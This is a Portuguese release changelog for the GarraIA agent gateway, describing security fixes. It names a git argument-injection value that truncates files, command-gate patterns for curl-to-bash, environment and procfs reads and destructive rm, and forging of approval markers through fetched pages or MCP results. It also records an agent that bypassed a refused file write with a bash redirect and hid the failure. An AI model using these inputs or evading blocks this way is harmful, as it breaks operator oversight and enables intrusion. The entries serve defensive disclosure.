  e agora e gravado em `totp_secret_enc`/`totp_secret_nonce` com AES-256-GCM
  sob a chave mestra do painel — a mesma que `admin/secrets.rs` ja usa para
  as chaves de provider no mesmo arquivo. Isso tira o comprometimento
  **duravel** do 2FA: o segredo em claro sobrevivia a expiracao da sessao e a
  troca de senha. Banco existente migra sozinho na primeira leitura (lazy
  upgrade forward-only, que zera a coluna antiga) — nao ha passo de operador.
  Decifrar falhando e indisponibilidade, nao "2FA desligado": trocar a chave
  mestra sem re-cifrar recusa o login em vez de abrir o painel so com a
  senha.
- **O re-key da chave mestra do painel passa a levar o segredo do 2FA junto
  (#1141).** Cifrar o segredo criou uma dependencia da chave mestra que a
  rotacao de parametros KDF nao conhecia: ela re-cifrava `secrets` e
  `secret_versions` e deixava `admin_users.totp_secret_enc` sob a chave
  antiga, o que virava HTTP 500 permanente no login de todo admin com 2FA
  ligado. As colunas do 2FA entram na mesma transacao do re-key, e um
  segredo que nao decifra com a chave legada aborta o re-key inteiro em vez
  de gravar parametros que nao abrem nada. Um `master.key` ilegivel tambem
  deixou de ser substituido em silencio: ele e preservado como
  `master.key.unreadable` com aviso no log.
- A varredura de segredos e o redactor de logs passam a cobrir o formato
  stateless dos installation tokens do GitHub (`ghs_` com pontos no corpo,
  ~520 chars; rollout 2026). `varredura-segredos.py` nao tinha padrao `ghs_`
  nenhum — token vazado passava batido; o redactor cobria `ghs_`, mas a classe
  de caracteres parava no primeiro ponto e vazava o restante para o log.
  Padroes na forma recomendada pelo GitHub (`ghs_` seguido de
  `[A-Za-z0-9.\-_]{36,}` no scanner), cobrindo stateful (40 chars) e
  stateless; tokens seguem tratados como opacos.
- **Adapters MQTT, Home Assistant e GPIO namespaceiam o id de registro (#1168).**
  `valida_segmento_topico` do adapter MQTT so recusava segmento vazio, `/`,
  `+` e `#` — `:` e `.` continuavam validos, os mesmos separadores usados
  pela convencao de id de outros adapters (`serial:<id>` e o
  `<dominio>.<objeto>` do Home Assistant). Um dispositivo MQTT malicioso ou
  mal configurado que publicasse um manifesto com esse formato de `id`
  reivindicava a mesma chave no `DeviceRegistry` compartilhado, e
  `DeviceRegistry::register` substituia o ocupante em silencio — um
  `digital_write` enderecado a um dispositivo ja adotado por outro
  transporte passaria a sair por um broker diferente. O adapter GPIO tinha o
  mesmo defeito por outra porta: o id da config aceita `.`, entao um
  `light.sala` declarado nos pinos do Pi colidia com o `entity_id` nativo de
  uma entidade do Home Assistant.
  Os tres adapters agora registram sob namespace proprio (`mqtt:<id>`,
  `ha:<entity_id>`, `gpio:<id>`) em vez do id bruto/nativo, fechando o
  conjunto com o `serial:<id>` que a #1130 ja tinha. Com os quatro
  transportes namespaceados, a colisao entre adapters deixa de ser uma
  coincidencia a evitar e vira estruturalmente impossivel, independente do
  que um dispositivo anuncie. O `DeviceStateStore` e o `HardwareEventBus`
  (motor de automacoes, #1128) seguem o mesmo id namespaceado, para ficar
  consistente com o que `device_list` mostra ao agente.
  `DeviceRegistry::register` passa a ser documentado como a variante
  intencional de "sim, isto deve sobrescrever" (reconexao MQTT, reentrega de
  estado do Home Assistant), com `register_if_absent` — fail-closed, recusa
  a colisao em vez de substituir — como a alternativa para quem registra uma
  vez so.
  O motor de automacoes (#1128) foi reconciliado com o namespace: o
  `domain` do contexto de condicao volta a ser derivado do id nativo
  (`ha:light.sala` da `light`, nao `ha:light`), senao uma condicao
  `domain == "light"` parava de casar em silencio e uma guarda negativa
  (`domain != "lock"`) virava sempre verdadeira — fail-open numa condicao
  escrita para barrar a acao. O `entity_id` do contexto segue sendo o id de
  registro namespaceado.
  **Migracao:** quem ja tinha specs de automacao escritas precisa
  reprefixar `trigger.entity` e `action.device` para o namespace do
  transporte que originou o dispositivo (`sensor.garagem` vira
  `ha:sensor.garagem`, `sensor-1` vira `mqtt:sensor-1`, e assim para
  `gpio:` e `serial:`) — o casamento e por string exata, entao uma regra
  com id antigo simplesmente nunca dispara. O id correto e o mesmo que a
  tool `device_list` mostra. Na carga da spec o motor emite `WARN` quando
  um `trigger.entity` ou `action.device` vem sem prefixo de transporte.
  Sem impacto em producao: `garraia-hardware` nunca foi lancado (todo o
  slice de hardware, incluindo automacoes e os adapters serial/GPIO, chegou
  depois da tag v0.4.1).

## [0.4.1] - 2026-09-09

Release de canais e de seguranca. Sete canais que estavam escritos mas nunca
chamados — Google Chat, Teams, LINE, IRC, Signal, Matrix e OpenClaw — passaram
a subir de verdade, e o CI passou a compilar e testar as cinco features de
canal que ninguem compilava. Com eles ligados, tres buracos que so o WhatsApp
tinha exposto viraram trabalho proprio: o webhook do WhatsApp aceitava
qualquer POST sem verificar assinatura, num canal que ja estava em producao; a
aprovacao humana de um comando de risco valia para o turno inteiro em vez de
para o comando aprovado; e o `GET /api/channels` reportava os quatro canais
push como offline para sempre, porque canal push nao entra no registry por
desenho.

Os dois de seguranca sairam maiores do que a descricao do issue sugeria,
porque a revisao achou em cada um um segundo buraco atras do primeiro. No
WhatsApp, verificar a assinatura nao bastava: o roteamento ainda escolhia o
canal pelo `phone_number_id` do corpo, entao quem tivesse o app secret de um
canal fazia a resposta sair com o `access_token` de outro. Na aprovacao,
recusar o marcador vindo do texto do modelo nao bastava: nem todo resultado de
ferramenta vem deste processo — uma pagina buscada pelo `web_fetch` ou a
resposta de um servidor MCP tambem viram resultado de ferramenta —, e com a
impressao digital sendo um hash de entradas publicas o atacante pre-computava
o marcador de um comando escolhido por ele. A impressao digital passou a ser
um HMAC com chave aleatoria por processo.

O gate de comandos fechou os fake-negativos que a auditoria do hardening
anterior tinha deixado documentados como residuo — script-file, `xargs -a`,
`awk` com `system()`, o `e` do GNU sed, `find -exec`, netcat e os verbos de
exfiltracao das CLIs de nuvem —, mais dois que a revisao deste ciclo achou:
`bash < script.sh` e a forma longa dos flags de wrapper que levam valor. Nada
disso ampliou deny-list por substring: sao regras por programa, com o script
tokenizado com aspas respeitadas, e cada uma tem teste do falso positivo que
ela nao pode causar. Do lado do app, o `/ws` passou a emitir o turno enquanto
ele acontece (`delta`, `tool_started`, `tool_finished`, `stopped`) e a aceitar
cancelamento; a metade Flutter disso segue em aberto.

Fechando o ciclo, o `sha` do rollback de skill deixou de ir cru para o `git`.
Nenhum shell estava envolvido, mas o `git` le um valor comecando com `-` como
opcao: um `POST` com `{"sha": "--output=/caminho"}` fazia o `git revert`
truncar aquele arquivo para zero byte, num modulo que e auth-free por
politica. O mesmo valor derrubava a task quando um caractere multi-byte caia
na fronteira que o codigo fatiava. A revisao mediu que o separador `--` nao
defende o `revert` — ele repassa ao parser de revisoes o que nao consumiu —,
entao quem fecha esse caminho e a validacao do formato, sozinha.

### Added
- **`garraia update` avisa de binarios antigos no PATH (#1030).** O update
  trocava so o proprio binario; um `/usr/bin/garraia` de outra instalacao
  seguia la, intocado e sem aviso — e era ele que scripts, cron e terminais
  com PATH diferente passavam a rodar. Depois de atualizar, o comando varre
  os diretorios do PATH e os de sistema (`/usr/local/bin`, `/usr/bin`) por
  outros `garraia`/`garra`, pergunta a versao de cada um (com timeout) e
  avisa os que diferem, com caminho, versao, se ele vem antes ou depois do
  atualizado no PATH e o comando para remover. `garraia update
  --check-binaries` roda so a varredura, sem baixar nada.
- **`web_search` funciona sem chave, via SearXNG self-hosted (#1034).** A tool
  era acoplada a API do Brave e so entrava no runtime com `BRAVE_API_KEY`;
  sem a chave o agente nao tinha busca nenhuma. O backend virou plugavel
  (`SearchBackend::{Brave, Searxng}`), com a nova secao `agent.web_search`
  (`backend: brave|searxng`, `searxng_url`, ou `GARRAIA_SEARXNG_URL`). Sem a
  secao a regra e a de sempre (Brave com chave); sem chave e com URL, SearXNG;
  `backend` explicito ganha e, se faltar o que ele precisa, a tool fica de
  fora e `garra config check` aponta. O SearXNG (`/search?format=json`)
  devolve `title`/`url`/`content` mapeados para o mesmo schema do Brave; a URL
  passa pelo guard de SSRF com loopback e LAN liberados e link-local/metadata
  de nuvem bloqueados, com cliente pinado como o `web_fetch`.
- **Ferramenta `garra_status`: o agente passa a conseguir descrever o proprio
  runtime (#1035).** Perguntado o que era, o Garra no celular respondia que "nao consegue
  inspecionar o estado interno do runtime a partir desta conversa" — e estava
  certo, nada permitia: `/api/health` e `/api/capabilities` existem para o console,
  `web_fetch` recusa loopback por desenho (guard de SSRF) e `bash` teria de
  adivinhar host e porta. A tool le o mesmo `AppState` daqueles endpoints (versao,
  uptime, provider e modelo ativos, ferramentas registradas, features, canais,
  modo e diretorio da sessao) sem fazer requisicao nenhuma, entao a superficie de
  SSRF fica onde estava. Sem segredo na saida: ids de provider e nomes de modelo,
  nunca chaves. A persona menciona as ferramentas, para o modelo usa-las antes de
  dizer que nao consegue.
- **`garra chat` registra as mesmas ferramentas do gateway (#1036).** A CLI
  registrava quatro tools (`file_read`, `file_write`, `bash`, `git_diff`) e o
  prompt do sistema listava-as a mao; `list_dir`, `repo_search`, `run_tests`,
  `web_fetch`, `web_search` e `code_review` ficavam de fora. Agora o conjunto e
  o do gateway mais `git_diff` — `run_tests` com confirmacao como o `bash`,
  `web_search` so com a chave do Brave, `code_review` com o provider e modelo
  da sessao — e a secao de ferramentas do prompt e gerada de `tool_names()`,
  para nunca mais anunciar o que nao existe. `schedule_*` seguem so no
  gateway, porque o chat nao abre `SessionStore`.
- **Copiar mensagem, codigo, memoria e log com um toque (#1041).** Relato de
  campo da v0.4.0: nao havia como copiar uma mensagem inteira — o texto do
  assistente era selecionavel por long-press sem nenhuma dica, e a bolha do
  usuario era `Text` puro. Toda bolha ganha um botao de copiar ao lado do
  horario e a do usuario vira selecionavel; bloco de codigo cercado ganha o
  proprio botao, que copia so o codigo; tocar numa memoria abre o texto completo
  com botao Copiar; o log da Activity tambem copia. Um so helper
  (`copyToClipboard`) para o app inteiro, com testes que interceptam
  `Clipboard.setData`.
- **`DELETE /api/memory/{id}` e apagar memoria pelo app (#1043).** Da para buscar
  na memoria, nao dava para apagar uma: `MemoryStore::delete_entry` existia e so
  a CLI usava; o `/api/*` do celular so tinha `DELETE /api/memory`, que apaga a
  sessao inteira. `MemoryProvider` ganha `delete_entry`, a rota devolve 204/404/
  503, e a folha de memoria do app ganha Apagar com confirmacao (aviso extra
  quando a entrada esta fixada, porque o store nao consulta o pin). Editar fica
  de fora: sem update no store, seria apagar-e-recriar com re-embedding.
- gateway: o `/ws` passa a emitir o turno enquanto ele acontece. Com
  `"stream": true` na mensagem, o cliente recebe `delta` a cada pedaco de
  texto e `tool_started`/`tool_finished` no ciclo de vida de cada ferramenta,
  e pode cancelar o turno com `{"type":"stop"}` — que responde `stopped` e
  nao persiste o parcial. Sem a flag, a sequencia de frames e a de sempre: so
  o `message` final. Como efeito, o socket passa a ser lido durante o turno,
  entao o heartbeat deixa de passar fome num turno longo. (#1047)
- canais: o Google Chat passa a ter rota. `POST /webhooks/google-chat`
  autentica cada requisicao pelo JWT RS256 que o Google manda no
  `Authorization`, conferindo assinatura, emissor e **audiencia** contra o
  JWK Set publico do `chat@system.gserviceaccount.com`. A audiencia e
  obrigatoria e o canal e recusado no boot sem ela: todo webhook do Chat,
  de toda app, e assinado pela mesma chave do Google, entao sem conferir o
  `aud` um token legitimo emitido para a app de outra pessoa passaria. As
  chaves publicas ficam num cache que se renova sozinho, com piso entre
  buscas para o `kid` do token — que quem manda a requisicao controla — nao
  virar gatilho de trafego de saida. `garra config check` ganha checagem
  propria dos dois campos. (#1050)
- canais: o IRC passa a ser registrado quando ha uma secao
  `[channels.<nome>]` com `channel_type = "irc"` e ao menos uma sala. A porta
  default passa a seguir o `use_tls` (6697 com, 6667 sem) em vez de 6667
  fixo, que apontaria TLS para a porta em claro. `garra config check` ganha
  avisos para servidor ausente, lista de salas vazia, e `use_tls` com a porta
  6667 — nenhum deles alcancado pela checagem generica, que procura token, e
  o IRC nao tem token. (#1050)
- canais: o LINE passa a ter rota. `POST /webhooks/line` verifica a assinatura
  `X-Line-Signature` sobre os **bytes crus** do corpo antes de qualquer parse,
  e e a assinatura — nao um campo do corpo, que quem manda controla — que
  decide de qual canal LINE configurado e o webhook. Todo modo de falha
  responde o mesmo 403 com o mesmo corpo, para o erro nao virar um oraculo.
  O `LineChannel` tinha `impl Channel` e a verificacao de assinatura (#1051)
  desde antes, e nenhum call-site. `garra config check` ganha checagem propria
  dos dois segredos: a generica procura `bot_token`/`access_token`/`app_token`
  e nao alcancava `channel_access_token` nem `channel_secret`. (#1050)
- canais: o Matrix passa a ser registrado quando ha uma secao
  `[channels.<nome>]` com `channel_type = "matrix"`. O `MatrixChannel` tinha
  `impl Channel` e sync loop desde antes, e nenhum call-site. `garra config
  check` ganha a env var que faltava para o token (`MATRIX_ACCESS_TOKEN`, sem
  a qual a falta dele saia em silencio) e um aviso para `homeserver_url`
  ausente, que nao e credencial e por isso escapava da checagem generica.
  (#1050)
- canais: o bridge OpenClaw passa a ser construido de fato quando ha uma
  secao `[channels.<nome>]` com `channel_type = "openclaw"` e `enabled = true`
  dos dois lados. Ate agora `state.openclaw_client` era `None` constante e as
  quatro rotas `/api/openclaw/*` caiam todas no ramo "nao configurado", com o
  cliente completo — loop de reconexao, conversao nos dois sentidos, status —
  sem ninguem para construi-lo. `garra config check` ganha um aviso para a
  armadilha dos dois `enabled` independentes e para `ws_url` que nao e
  WebSocket. (#1050)
- canais: o Signal passa a ser registrado de verdade quando ha uma secao
  `[channels.<nome>]` com `channel_type = "signal"`. O `SignalChannel` tinha
  `impl Channel`, polling do daemon signal-cli e o guard `vet_signal_cli_url`
  desde antes, e nenhum call-site. Como o daemon e local e sobe por fora,
  falha de conexao no boot segue o retry com backoff do Telegram em vez de
  ser terminal. `garra config check` ganha aviso proprio: o Signal nao tem
  token, entao a checagem generica nao o alcancava e um canal pela metade
  saia sem um unico achado. (#1050)
- canais: o Microsoft Teams passa a ter rota. `POST /webhooks/teams` autentica
  cada requisicao pelo JWT RS256 do Bot Framework, conferindo assinatura,
  emissor e audiencia (o `app_id` do bot) contra o JWK Set publico. O `app_id`
  e obrigatorio e o canal e recusado no boot sem ele: todos os tokens do Bot
  Framework sao assinados pelas mesmas chaves, entao sem `aud` um token
  emitido para o bot de outra pessoa passaria. (#1050)
- **Nova tool MCP `garra_agent`: agente completo com ferramentas, opt-in do
  operador.** O servidor MCP (`garra mcp-server`) continua expondo o
  `garra_ask` LLM-only como antes; quando o operador inicia o processo com
  `GARRAIA_MCP_ENABLE_TOOLS=1`, `tools/list` passa a anunciar tambem o
  `garra_agent`, que roda um turno de agente completo em sessao nova por
  chamada — bash (sem canal de confirmacao; com o hardening #1075 o tier
  de risco e fail-closed: comandos sensiveis sao BLOQUEADOS, e o filho
  herda so a allowlist de env — ver fragmento em `security/`), file_read,
  file_write, web_fetch, git_diff e web_search (com chave Brave). Sem a env,
  nem o anuncio nem o dispatch existem: o servidor rejeita `garra_agent` como
  tool desconhecida e o comportamento fica identico ao de hoje.

  A resposta vem no envelope `garra.agent.v1`, com o mesmo formato do
  `garra.ask.v1` mais `session_id` e `tool_calls` (nome, duracao, sucesso,
  resumo — ja redigidos na origem), tambem em falha e timeout, para o host MCP
  ver o que o agente executou. `GARRAIA_MCP_MAX_TIMEOUT_SECS` passa a limitar
  tambem a nova tool (teto proprio de 1800s; default 300s). O handler mora em
  `mcp_agent.rs`, modulo novo que os testes de auditoria de `mcp_server.rs`
  nao escaneiam por desenho — o arquivo de dispatch continua sem registrar
  ferramenta, sem spawnar processo e sem escrever no stdout.

  O system prompt default do agente obriga a relatar na resposta final
  qualquer ferramenta que falhar ou for bloqueada — nunca reportar sucesso
  sem saida real e nunca contornar silenciosamente um bloqueio de seguranca
  (observado em repro real: `file_write` recusado e contornado via redirect
  bash, com a falha omitida da prosa; ver issue #1075).

### Changed
- console web: as chamadas para `/api/*` passam a levar `Authorization:
  Bearer` com a `gateway.api_key` guardada, a mesma que o console ja mandava
  como `?token=` no WebSocket. Sem chave configurada nada muda. Prepara o
  gate do REST, que entra em seguida. (#1045)
- docs: `hardening-gateway.md`, `auth-config.md`, `mobile-qa-checklist.md` e o
  README do app passam a descrever o gate do REST como ele ficou: com
  `gateway.api_key` configurada, `/api/*` exige `Authorization: Bearer`, com
  `/api/health`, `/api/capabilities` e `/api/auth-check` abertas para o
  onboarding funcionar antes de haver chave. Sem chave configurada, nada
  muda. (#1045)

### Fixed
- **`POST /api/sessions` aplica `mode` e `working_dir` em vez de engoli-los (#1028).**
  O corpo aceitava qualquer campo e descartava o que nao conhecia: `{"mode":
  "search"}` devolvia 201 e a sessao nascia sem politica nenhuma — a escrita de
  arquivo que o modo devia bloquear passava — e `working_dir` nunca chegava as
  ferramentas de arquivo (o handler que o aceitava nunca foi roteado). Agora
  `mode` e validado pela mesma funcao do `POST /api/mode/select` (nativos e
  customizados), gravado como modo escolhido antes da resposta e ecoado nela;
  `working_dir` passa por `project_root::confine` como o `path` de projeto e a
  resposta ecoa o canonicalizado. Nome de modo desconhecido ou diretorio fora
  das raizes e 400 sem criar sessao; `mode` sem `session_store` e 503 em vez de
  fingir que aplicou. Quem nao manda nenhum dos dois nao ve diferenca.
- **`GET /v1/models` lista os modelos que o gateway de fato serve (#1029).** A
  resposta era uma lista fixa (`gpt-4`, `gpt-3.5-turbo`, `claude-3-opus`, ...)
  que nao lia a config: um cliente OpenAI-compatible (VS Code, Continue) listava,
  escolhia um e recebia 500 do provider real. Agora a lista sai dos providers
  registrados — o modelo configurado de cada um — filtrada pela mesma regra de
  roteamento que `POST /v1/chat/completions` aplica ao campo `model`: entra o
  modelo do provider default e qualquer modelo cujo prefixo (`openrouter/auto`,
  `anthropic/...`) ja o leve ao provider certo; um nome sem prefixo num provider
  que nao e o default fica de fora, porque nenhum id o alcancaria. `owned_by`
  passa a ser o id do provider no GarraIA.
- **Quatro ferramentas do agente existiam e nunca foram registradas; e o
  diretorio da sessao nao chegava ao turno HTTP (#1033, #1035).** `list_dir`,
  `repo_search`, `run_tests` e `code_review` tinham schema e testes verdes, mas o
  unico `new()` delas no repo era dentro dos proprios testes — as whitelists dos
  modos `search`, `debug` e `review` anunciavam `list_dir` e `repo_search` que o
  modelo nunca recebia. Agora entram no bootstrap do gateway (`code_review` com o
  provider e modelo default do boot). E `exec_context_for` passou a levar
  `SessionState::working_dir` para o `ExecContext`: antes todo turno via
  `/api/sessions/{id}/messages` saia sem diretorio, e o `resolve_tool_path`
  recusava qualquer caminho relativo — o Garra no celular dizia que nao conseguia
  olhar os proprios arquivos, e nao conseguia mesmo. As tres passam pelo
  mesmo `resolve_tool_path` do `file_read` (relativo ao diretorio da sessao,
  `..` recusado, e sem sessao o erro diz que resolveu contra o CWD do
  processo), `repo_search`
  busca no diretorio da sessao e `run_tests` respeita
  `agent.tool_confirmation_enabled` como o `bash` — roda `npm test`, que
  executa o que o `package.json` mandar. O modo `debug` ganha `run_tests` e o
  `review` ganha `code_review` na whitelist.
- **O aviso de recall vazio nomeia a causa certa (#1037).** Quando o indice
  vetorial achava vizinhos e nenhum sobrevivia ao reescopo, o log culpava
  "troca de modelo de embeddings sem reindexacao" em todos os casos — inclusive
  no mais comum, sessao nova com memoria de outras sessoes, onde reindexar nao
  muda nada. Agora o store conta os candidatos por modelo antes de avisar:
  `WARN` de troca de modelo so quando nenhum candidato tem o modelo ativo
  (com os modelos encontrados); `INFO` "fora do escopo pedido" quando a
  memoria existe com o modelo certo mas e de outra sessao, com os filtros
  aplicados (tenant, sessao, continuidade); e `WARN` de vetor orfao quando o
  indice aponta para ids sem linha. A secao Isolamento de `docs/src/memory.md`
  passa a documentar os quatro filtros do recall — inclusive o de `session_id`,
  que era o omitido — e o que `memory.shared_continuity` faz de fato (#1038).
- **Comandos com barra passam a funcionar pelo HTTP, e o app sugere ao
  digitar `/` (#1040).** No celular, `/help` voltava "nao ha comandos com barra
  registrados nesta instalacao" — alucinacao: o registry estava cheio (17
  comandos populados no boot), mas o unico call site de
  `CommandRegistry::dispatch` era o adapter do Telegram, e pelo HTTP o texto ia
  cru para o modelo. `POST /api/sessions/{id}/messages` despacha pelo registry
  quando o texto comeca com um nome registrado (desconhecido segue ao modelo,
  como antes; papel `User`, entao comandos de owner respondem "permission
  denied"; `/start`, que reivindica o dono da allowlist do Telegram, nem e
  aceito pelo HTTP). `CommandContext` ganha `session_id`, e os comandos de
  sessao (`/clear`, `/mode`, `/goal`) usam o id do HTTP quando existe. `GET
  /api/slash-commands` e o `commands` de `/api/capabilities` passam a listar o
  registry no papel do HTTP, em vez de uma tabela paralela de dois itens e da
  lista completa com comandos de owner. O dispatcher solta o lock do registry
  antes de executar (o `/help` le o registry de novo; um read segurado sobre
  outro read trava assim que um writer entra na fila) e `/model` valida o nome.
  No app,
  `SlashSuggestions` mostra chips dos comandos que casam com o prefixo digitado
  e os chips da tela Skills abrem o chat com o comando pronto.
- memoria: com `shared_continuity` ligado, o recall do agente passa a usar a
  chave de continuidade **no lugar** do escopo de sessao, e nao somada a ele.
  O store faz AND entre os dois filtros, entao a flag nao compartilhava nada:
  uma sessao nova so enxergava o que ela mesma tinha gravado sob a mesma
  chave. Com a flag desligada nada muda — o escopo por sessao continua
  valendo. (#1042)
- **Turno de streaming vazio deixa de virar bolha em branco no canal (#1048).**
  Quando o stream do provider terminava sem nenhum `TextDelta` e sem nenhuma
  ferramenta, o turno devolvia string vazia e o Telegram — como qualquer outro
  canal que passe pelo caminho de streaming — publicava uma mensagem em branco.
  O retry e o fallback de provider nao pegavam o caso: `stream_complete_with_
  fallback` devolve o stream **antes** de qualquer evento existir, e
  `is_retryable_error` so olha texto de erro, e aqui nao ha erro nenhum a
  olhar. A deteccao passou para o consumidor do stream: volta vazia refaz a
  rodada pelo caminho nao-streaming, que tem retry e fallback de verdade. O
  redo e limitado a um por turno, porque nenhuma guarda do loop conta volta
  vazia e sem o limite um provider mudo giraria sem parar. Turno inteiramente
  vazio, nos dois caminhos, termina em erro explicito, que o canal mostra, em
  vez de fingir que respondeu — mas so quando **nada** foi entregue: se o
  modelo ja mandou texto nas voltas anteriores, o turno encerra com o que ha,
  porque descartar resposta ja publicada seria pior que o bug original.
- **O ramo nao-streaming de dentro do turno de streaming parou de publicar um
  marcador interno como se fosse resposta (#1048).** Ali o vazio nao dava bolha
  em branco: dava `[no textual response provided by the model]`, em ingles, que
  o usuario le como resposta do modelo. `extract_text` continua devolvendo o
  marcador para quem precisa de uma `String` sempre, mas a decisao passou a
  usar a irma `extract_text_opt`, que preserva o "veio vazio". O `text_len` do
  log do batch tambem media o marcador, e passou a medir a resposta. O escopo
  e esse: o caminho nao-streaming **autonomo** (`process_message_with_agent_
  config`, que serve o app mobile, o `/ws`, o `/v1/chat/completions` nao-
  streaming e o chat REST) continua publicando o marcador, e sai num trabalho
  proprio.
- canais: `google_chat` deixa de escrever um `Default` que o clippy pede
  derivado, e `matrix` colapsa dois `if` aninhados. Os tres erros existiam
  desde sempre e nao apareciam porque nenhum job do CI compilava essas
  features — o step novo do `ci.yml` passa a compilar e testar as cinco que
  faltavam (`google_chat`, `teams`, `matrix`, `irc`, `voice`). (#1050)
- `GET /api/channels` parou de reportar os quatro canais push (WhatsApp,
  Google Chat, Teams, LINE) como `offline` num gateway saudavel. Canal push
  nao entra no `ChannelRegistry` por desenho — vira estado da rota
  `/webhooks/*` —, entao derivar status do registry dava `offline` eterno.
  O `KNOWN_CHANNELS` ganhou uma coluna `kind` (`Pull` | `Push`) e o status
  dos push passa a vir das listas que de fato subiram, e nao do arquivo de
  config: um canal configurado mas recusado no boot continua aparecendo
  como `offline`, que e a verdade. (#1079)

### Security
- learning: o `sha` do corpo de `POST /api/learning/skills/{name}/rollback`
  passa a ser validado (hexadecimal, 7 a 40 caracteres) antes de virar
  argumento do `git`. Ate aqui o valor ia cru para o `git revert`, num modulo
  que e auth-free por politica: nenhum shell esta envolvido, mas o `git` le um
  valor comecando com `-` como **opcao**, e um `POST` com
  `{"sha": "--output=/caminho"}` truncava aquele arquivo para zero byte. O
  mesmo valor tambem derrubava a task com `end byte index 8 is not a char
  boundary` quando um caractere multi-byte caia na fronteira que o `short_sha`
  fatia. Recusa fail-closed: nenhum processo e criado com valor invalido, e a
  resposta 400 nao ecoa o que foi recusado (#1086).
- learning: `git add` passa a separar o caminho com `--`, para que um caminho
  nunca possa ser lido como flag. Medido em git 2.43.0, o mesmo separador
  **nao** defende o `git revert` — ele repassa ao parser de revisoes o que nao
  consumiu, e `--output=` continua valendo depois do `--`. Ele fica ali por
  consistencia, e a validacao de formato e a unica barreira daquele call site;
  esta escrito assim no codigo, para ninguem relaxar a validacao confiando
  numa camada que nao existe (#1086).
- gateway: com `gateway.api_key` configurada, as rotas `/api/*` passam a
  exigir `Authorization: Bearer`. Antes a chave valia so no handshake do
  `/ws`, e todo o REST — sessoes, memoria, providers, logs, diagnosticos —
  respondia a qualquer um que alcancasse a porta, o que num gateway em
  `0.0.0.0` e a rede inteira. Ficam abertas `/api/health`,
  `/api/capabilities` e `/api/auth-check`, que o onboarding do app e o
  console consultam antes de haver chave. Sem chave configurada nada muda.
  A comparacao de token do `/ws` deixa de sair cedo por comprimento, que
  entregava um oraculo de tamanho por tempo de resposta. (#1045)
- teams: o `serviceUrl` que decide para qual host a resposta vai — com o
  bearer do bot junto — vinha do corpo da requisicao e era usado sem
  verificacao. Agora ele so vale se casar com a claim `serviceurl` assinada
  pela Microsoft no proprio token, e o POST de saida ainda passa pelo
  `garraia_common::ssrf` (https-only, faixas publicas, IP pinado), que barra
  169.254.169.254 e a rede interna mesmo para uma URL legitimamente assinada.
  O `conversation_id`, que tambem vem do corpo, passou a ser percent-encodado
  em vez de concatenado no caminho. O canal nao tinha rota ate agora, entao
  nenhuma instalacao esteve exposta. (#1050)
- **A assinatura do webhook do LINE passa a ser verificada de verdade (#1051).**
  `validate_signature` era um stub com `TODO` que devolvia `true` para qualquer
  entrada: quem descobrisse a URL do webhook podia forjar mensagem como se
  viesse do LINE, porque essa assinatura e a unica prova de autenticidade que o
  protocolo oferece. O modulo novo `line_channel::signature` implementa o
  contrato real — `Base64(HMAC-SHA256(channel_secret, corpo_cru))` comparado com
  o header `X-Line-Signature` em tempo constante (`subtle::ConstantTimeEq`),
  sobre a mesma pilha RustCrypto ja usada em `garraia-auth` e `garraia-storage`.
  Base64, nao hex: um digest de 32 bytes da 44 chars em Base64 e 64 em hex, e o
  formato errado recusaria toda requisicao legitima. `LineChannel::new` passou a
  devolver `Result` e recusa `channel_secret` vazio, entao o canal nao chega a
  existir sem o segredo — a checagem fica no construtor, e nao no bootstrap,
  para que nenhum wiring futuro consiga pular. O canal LINE continua sem chegar
  ao gateway (#1050), entao o impacto hoje e nulo; isto e a precondicao que
  faltava para liga-lo.
- **A verificacao de assinatura do LINE deixa de aceitar segredo so com
  espacos (#1051).** O construtor `LineChannel::new` recusa `channel_secret`
  em branco desde o PR #1057, mas `line_signature::verify_signature` media
  "vazio" com `is_empty()` em vez de `trim().is_empty()`. As duas discordavam,
  e a mais fraca era justamente a exportada: `verify_signature` e API publica
  reexportada, e `ChannelConfig.settings` e um mapa nao-tipado, entao um
  `channel_secret = "   "` no TOML passava pela config e a funcao validava
  contra essa chave — que qualquer um reproduz. O impacto hoje segue nulo (o
  canal LINE nao chega ao gateway, #1050), mas quem escrever o handler do
  webhook chamaria a funcao direto, e nesse dia o teatro seria real.
- O webhook do WhatsApp passa a verificar a assinatura `X-Hub-Signature-256`
  (HMAC-SHA256 do app secret sobre os bytes crus do corpo). Ate aqui
  `POST /webhooks/whatsapp` aceitava qualquer requisicao, num canal que ja
  estava ligado em producao: quem descobrisse a URL podia mandar mensagem como
  qualquer numero, gastar token do provider a cada POST, forjar um `from` da
  allowlist e, numa instalacao nova, reivindicar o papel de owner. Um canal sem
  `app_secret` agora e recusado no boot em vez de subir em modo degradado
  (#1070).
- Com mais de um canal WhatsApp configurado, quem atende passa a ser o canal
  que **assinou**, e nao o que o `metadata.phone_number_id` do corpo aponta.
  O roteamento por corpo deixava quem conhecesse o app secret de um canal
  assinar um corpo apontando para outro e receber a resposta enviada com o
  `access_token` do outro — escalada entre canais a partir da credencial de
  menor valor. Um corpo assinado que reivindica o numero de outro canal
  configurado agora e descartado (#1070).
- O `hub.verify_token` do handshake `GET` do WhatsApp passou a comparacao em
  tempo constante sobre digests SHA-256 dos dois lados, o que tambem para de
  vazar o comprimento do token configurado pelo tempo de resposta (#1070).
- **Hardening do BashTool e do safety_gate: tier de risco fail-closed e
  isolamento de ambiente (#1075).** O tier de risco do bash deixa de
  auto-executar quando nao ha canal de confirmacao: com
  `tool_confirmation_enabled: false` (MCP `garra_agent`, heartbeats), um
  comando sensivel e BLOQUEADO; com confirmacao habilitada (gateway/
  Telegram), continua pedindo aprovacao como antes. Em modo fail-closed o
  flag `is_confirmation_approved` e ignorado: ele vem do historico da
  conversa (marcador `[CONFIRM_REQUIRED]`) e pode ser contaminado pela
  saida do modelo. `run_tests` segue a mesma regra — sem canal de
  confirmacao, e bloqueado (npm/cargo scripts sao codigo arbitrario).
  O `is_risky` ganha normalizacao de whitespace (mata o bypass
  `rm  -rf` por substring), deteccao program-aware POR SEGMENTO de
  metacaracteres com resolucao de wrappers (`sudo curl`, `env VAR=x cargo
  test`, `timeout 10 curl`; subcomandos mutantes de git/systemctl/docker/
  kubectl/helm/terraform/npm/cargo, `deploy`), programas exfiltraveis
  (`curl`, `wget`, `ssh`, `env`, `printenv`, ...), interpolacao de env
  (`$(env)`, backticks), pipe para shell sem espaco (`curl x|bash`),
  leitura de procfs (`/proc/*/environ`), `rm` destrutivo token-aware
  (`rm -fr /`, `-f -r`, `--recursive`), `find -delete`, `dd of=`,
  desembrulho recursivo de `sh -c '...'` e gating de
  `python3 -c`/`perl -e`; consequencia visivel: TODO `git push` e
